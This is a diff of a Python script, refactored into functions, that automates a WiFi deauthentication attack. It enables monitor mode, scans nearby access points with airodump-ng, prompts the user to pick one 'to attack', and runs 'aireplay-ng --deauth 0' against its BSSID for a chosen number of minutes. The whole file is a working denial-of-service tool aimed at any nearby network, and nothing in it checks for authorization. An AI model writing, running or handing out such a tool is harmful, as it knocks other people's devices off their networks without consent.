@@ -1,29 +1,12 @@
 #!/usr/bin/env python3
+import os
 import subprocess
 import re
-import csv
-import os
 import time
-import shutil
-from datetime import datetime
 import signal
 import sys
-
-
-active_wireless_networks = []
-
-
-def check_for_essid(essid, lst):
-    check_status = True
-    if len(lst) == 0:
-        return check_status
-
-    for item in lst:
-        if essid in item["ESSID"]:
-            check_status = False
-
-    return check_status
-
+import glob
+import shutil
 
 print(
     r"""
@@ -44,165 +27,300 @@ o8o        `8  `Y8bod8P'   "888"         o8o        `8  o888o o888o o888o     88
 """
 )
 
+# Global variables
+monitor_process = None
+interface = None
+ap_list_file = "ap_list.csv"
 
-if not "SUDO_UID" in os.environ.keys():
-    print("Try running this program with sudo.")
-    exit()
+
+def check_sudo():
+    """Check if the script is run with sudo."""
+    if not "SUDO_UID" in os.environ:
+        print("\033[31mThis script must be run with sudo.\033[0m")
+        sys.exit(1)
 
 
-for file_name in os.listdir():
-    if ".csv" in file_name:
+def check_tools():
+    """Check if airmon-ng, airodump-ng, and aireplay-ng are installed."""
+    required_tools = ["airmon-ng", "airodump-ng", "aireplay-ng"]
+    missing_tools = []
+
+    for tool in required_tools:
+        if not shutil.which(tool):
+            missing_tools.append(tool)
+
+    if missing_tools:
+        print("\nThe following required tools are missing:")
+        for tool in missing_tools:
+            print(f"- {tool}")
+        print("\nPlease install them using the following command:")
+        print("sudo apt update && sudo apt install aircrack-ng -y")
+        sys.exit(1)
+
+
+def list_wlan_interfaces():
+    """List available WLAN interfaces."""
+    wlan_pattern = re.compile("^wlan[0-9]+")
+    iwconfig_output = subprocess.run(["iwconfig"], capture_output=True).stdout.decode()
+    wlan_interfaces = wlan_pattern.findall(iwconfig_output)
+
+    if not wlan_interfaces:
         print(
-            "There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory."
+            "\033[31mNo wireless interfaces found. Please connect a wireless adapter.\033[0m"
         )
-        directory = os.getcwd()
+        sys.exit(1)
+
+    print("Available wireless interfaces:\n")
+    for idx, wlan in enumerate(wlan_interfaces):
+        print(f"\033[33m{idx}: {wlan}\033[0m")
+
+    return wlan_interfaces
+
+
+def select_interface(wlan_interfaces):
+    """Allow the user to select a WLAN interface."""
+    while True:
         try:
-            os.mkdir(directory + "/backup/")
-        except:
-            print("Backup folder exists.")
-        timestamp = datetime.now()
-        shutil.move(
-            file_name, directory + "/backup/" + str(timestamp) + "-" + file_name
+            choice = input("\nSelect the interface you want to use: ").strip()
+            if choice.isdigit():
+                num = int(choice)
+                if 0 <= num < len(wlan_interfaces):
+                    return wlan_interfaces[num]
+                else:
+                    print("\033[31mInvalid selection. Try again.\033[0m")
+            else:
+                print("\033[31mPlease enter a valid number.\033[0m")
+        except ValueError:
+            print("Please enter a valid number.")
+
+
+def enable_monitor_mode(interface):
+    """Enable monitor mode on the selected interface."""
+    try:
+        print("\033[34m\nEnabling monitor mode.This can take few seconds....\n\033[0m")
+        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
+        time.sleep(1)
+        subprocess.run(["sudo", "iw", interface, "set", "type", "monitor"], check=True)
+        time.sleep(1)
+        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
+        print(f"\033[32mMonitor mode enabled on {interface}.\033[0m")
+        time.sleep(4)
+    except subprocess.CalledProcessError:
+        print(f"\033[31mFailed to enable monitor mode on {interface}.\033[0m")
+        sys.exit(1)
+
+
+def disable_monitor_mode(interface):
+    """Disable monitor mode and return the interface to managed mode."""
+    try:
+        print("\033[34mDisabling monitor mode.This can take few seconds....\n\033[0m")
+        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
+        time.sleep(1)
+        subprocess.run(["sudo", "iw", interface, "set", "type", "managed"], check=True)
+        time.sleep(1)
+        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
+        time.sleep(4)
+        print(f"\033[32mManaged mode restored on {interface}.\033[0m")
+    except subprocess.CalledProcessError:
+        print(f"\033[31mFailed to disable monitor mode on {interface}.\033[0m")
+
+
+def start_scanning(interface):
+    """Start scanning for access points."""
+    global monitor_process
+
+    # Remove existing CSV files with the same base name
+    for file in os.listdir():
+        if file.startswith("ap_list") and file.endswith(".csv"):
+            os.remove(file)
+    print("\033[34m\nScanning for access points. Be patient...\n\033[0m")
+    time.sleep(5)
+
+    # Run airodump-ng and write output to a specific CSV file
+    monitor_process = subprocess.Popen(
+        ["sudo", "airodump-ng", "-w", "ap_list", "--output-format", "csv", interface],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    time.sleep(30)
+
+
+def stop_scanning():
+    """Stop the scanning process."""
+    global monitor_process
+    if monitor_process:
+        monitor_process.terminate()
+        monitor_process.wait()
+
+
+def parse_ap_list():
+    """Parse the AP list from the most recent CSV file."""
+
+    # Find the latest AP list file matching the prefix
+    ap_files = sorted(glob.glob("ap_list-*.csv"), key=os.path.getmtime, reverse=True)
+    if not ap_files:
+        print("AP list file not found. Ensure scan is running.")
+        return []
+
+    aps = []
+    try:
+        with open(ap_files[0], "r") as f:
+            lines = f.readlines()
+            for line in lines:
+                if "Station MAC" in line:
+                    break
+                parts = line.split(",")
+                if len(parts) >= 14 and "BSSID" not in parts[0]:
+                    aps.append(
+                        {
+                            "BSSID": parts[0].strip(),
+                            "PWR": parts[8].strip(),
+                            "CH": parts[3].strip(),
+                            "ENC": parts[5].strip(),
+                            "ESSID": parts[13].strip(),
+                        }
+                    )
+    except FileNotFoundError:
+        print("\033[31mError reading the AP list file.\033[0m")
+    return aps
+
+
+def display_ap_list(aps):
+    """Display the APs in a clean numbered list."""
+    print("\nAvailable Access Points:")
+    print(f"{'No.':<5} {'BSSID':<20} {'PWR':<5} {'CH':<5} {'ENC':<8} {'ESSID':<20}")
+    print("-" * 60)
+    for idx, ap in enumerate(aps):
+        print(
+            f"{idx:<5} {ap['BSSID']:<20} {ap['PWR']:<5} {ap['CH']:<5} {ap['ENC']:<8} {ap['ESSID']:<20}"
+        )
+    time.sleep(3)
+
+
+def select_ap(aps):
+    """Allow the user to select an AP from the list."""
+    while True:
+        try:
+            print(f"Available APs count: {len(aps)}")  # Debugging line
+            choice = input("\nSelect the AP to attack (by number): ").strip()
+            print(f"\nUser selected: {choice}")  # Debugging line
+            if choice.isdigit():
+                choice = int(choice)
+                if 0 <= choice < len(aps):
+                    print(f"AP {aps[choice]['ESSID']} selected.")  # Debugging line
+                    return aps[choice]
+                else:
+                    print("\033[31mInvalid selection. Try again.\033[0m")
+            else:
+                print("\033[31mPlease enter a valid number.\033[0m")
+        except EOFError:
+            print(
+                "\033[31m\nEOFError: Input stream ended unexpectedly. Please try again.\033[0m"
+            )
+        except ValueError:
+            print("\033[31mPlease enter a valid number.\033[0m")
+
+
+def start_deauth_attack(selected_ap, interface):
+    """Start a deauthentication attack on the selected AP."""
+    try:
+        time.sleep(3)
+        duration = input(
+            "\nEnter the duration of the attack in minutes (e.g., 1, 2, 3, ...): "
+        ).strip()
+        print(f"\nUser provided: {duration}")
+        if duration.isdigit():
+            num = int(duration)
+            if num <= 0:
+                print("\033[31mDuration must be greater than 0.\033[0m")
+                return
+        else:
+            print("\033[31mPlease enter a valid number.\033[0m")
+
+        print(
+            f"\033[34m\nStarting deauth attack on {selected_ap['ESSID']} ({selected_ap['BSSID']}) for {num} minute(s).\033[0m"
+        )
+        # Calculate duration in seconds
+        duration_seconds = num * 60
+        start_time = time.time()
+
+        # Command to execute aireplay-ng
+        deauth_command = [
+            "sudo",
+            "aireplay-ng",
+            "--deauth",
+            "0",  # Infinite deauth packets
+            "-a",
+            selected_ap["BSSID"],  # Target AP's BSSID
+            interface,
+        ]
+
+        # Run aireplay-ng in a subprocess
+        deauth_process = subprocess.Popen(
+            deauth_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
 
+        # Monitor the time
+        while time.time() - start_time < duration_seconds:
+            time.sleep(1)
 
-wlan_pattern = re.compile("^wlan[0-9]+")
+        # Stop the attack
+        print("\033[34m\nStopping the deauth attack...\033[0m")
+        deauth_process.terminate()
+        deauth_process.wait()
+        print("Deauth attack stopped.")
 
-check_wifi_result = wlan_pattern.findall(
-    subprocess.run(["iwconfig"], capture_output=True).stdout.decode()
-)
-
-if len(check_wifi_result) == 0:
-    print("Please connect a WiFi adapter and try again.")
-    exit()
-
-print("The following WiFi interfaces are available:")
-for index, item in enumerate(check_wifi_result):
-    print(f"{index} - {item}")
-
-while True:
-    wifi_interface_choice = input(
-        "Please select the interface you want to use for the attack: "
-    )
-    try:
-        if check_wifi_result[int(wifi_interface_choice)]:
-            break
-    except:
-        print("Please enter a number that corresponds with the choices available.")
-
-hacknic = check_wifi_result[int(wifi_interface_choice)]
-
-print(f"Putting {hacknic} into monitor mode:")
-subprocess.run(["sudo", "ip", "link", "set", hacknic, "down"])
-time.sleep(3)
-subprocess.run(["sudo", "iw", hacknic, "set", "type", "monitor"])
-time.sleep(3)
-subprocess.run(["sudo", "ip", "link", "set", hacknic, "up"])
-print("\nThis will take few seconds...\n")
-time.sleep(15)
-
-discover_access_points = subprocess.Popen(
-    [
-        "sudo",
-        "airodump-ng",
-        "-w",
-        "file",
-        "--write-interval",
-        "1",
-        "--output-format",
-        "csv",
-        hacknic,
-    ],
-    stdout=subprocess.DEVNULL,
-    stderr=subprocess.DEVNULL,
-)
-
-
-def terminate_script():
-    print("\nTerminating the script and changing mode back to managed...")
-    try:
-        subprocess.run(["sudo", "airmon-ng", "stop", hacknic], check=True)
-    except subprocess.CalledProcessError:
-        print("Error stopping monitor mode.")
-    try:
-        subprocess.run(["sudo", "ip", "link", "set", hacknic, "down"], check=True)
-        subprocess.run(["sudo", "iw", hacknic, "set", "type", "managed"], check=True)
-        subprocess.run(["sudo", "ip", "link", "set", hacknic, "up"], check=True)
-    except subprocess.CalledProcessError:
-        print("Error reverting to managed mode.")
-    sys.exit()
+    except ValueError:
+        print(
+            "\033[31mInvalid input. Please enter a valid number for the duration.\033[0m"
+        )
+    except Exception as e:
+        print(f"\033[31mAn error occurred: {e}\033[0m")
 
 
 def signal_handler(sig, frame):
-    terminate_script()
+    """Handle termination signals."""
+    print("\nCleaning up and exiting...")
+    stop_scanning()
+    disable_monitor_mode(interface)
+    sys.exit(0)
 
 
+# Register signal handlers
 signal.signal(signal.SIGINT, signal_handler)
 signal.signal(signal.SIGTERM, signal_handler)
 
-try:
-    while True:
-        subprocess.call("clear", shell=True)
-        for file_name in os.listdir():
-            fieldnames = [
-                "BSSID",
-                "First_time_seen",
-                "Last_time_seen",
-                "channel",
-                "Speed",
-                "Privacy",
-                "Cipher",
-                "Authentication",
-                "Power",
-                "beacons",
-                "IV",
-                "LAN_IP",
-                "ID_length",
-                "ESSID",
-                "Key",
-            ]
-            if ".csv" in file_name:
-                with open(file_name) as csv_h:
-                    csv_h.seek(0)
-                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
-                    for row in csv_reader:
-                        if row["BSSID"] == "BSSID":
-                            pass
-                        elif row["BSSID"] == "Station MAC":
-                            break
-                        elif check_for_essid(row["ESSID"], active_wireless_networks):
-                            active_wireless_networks.append(row)
 
-        print(
-            "Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n"
-        )
-        print("No |\tBSSID              |\tChannel|\tESSID                         |")
-        print("___|\t___________________|\t_______|\t______________________________|")
-        for index, item in enumerate(active_wireless_networks):
-            print(
-                f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}"
-            )
-        time.sleep(1)
+if __name__ == "__main__":
+    # Step 1: Check for sudo
+    check_sudo()
 
-except KeyboardInterrupt:
-    print("\nReady to make choice.")
-    while True:
-        choice = input("Please select a choice from above or type 'exit' to quit: ")
-        if choice.lower() == "exit":
-            terminate_script()
-        try:
-            if active_wireless_networks[int(choice)]:
-                break
-        except:
-            print("Please try again.")
+    # Step 2: Check for required tools
+    check_tools()
 
+    try:
+        # Step 3: List WLAN interfaces and select one
+        wlan_interfaces = list_wlan_interfaces()
+        interface = select_interface(wlan_interfaces)
 
-hackbssid = active_wireless_networks[int(choice)]["BSSID"]
-hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
+        # Step 4: Enable monitor mode
+        enable_monitor_mode(interface)
 
+        # Step 5: Start scanning for APs
+        start_scanning(interface)
 
-subprocess.run(["sudo", "iw", hacknic, "set", "channel", hackchannel])
+        # Step 6: Parse and display APs
+        aps = parse_ap_list()
+        display_ap_list(aps)
 
-print("Deauthenticating clients...")
-subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
-print("Deauthentication attack in progress. Press Ctrl+C to stop.")
+        # Step 7: Select an AP to attack
+        selected_ap = select_ap(aps)
+        print(f"\nSelected AP: {selected_ap['ESSID']} ({selected_ap['BSSID']})")
+
+        # Step 8: Start the deauthentication attack
+        start_deauth_attack(selected_ap, interface)
+
+    finally:
+        # Cleanup
+        stop_scanning()
+        disable_monitor_mode(interface)
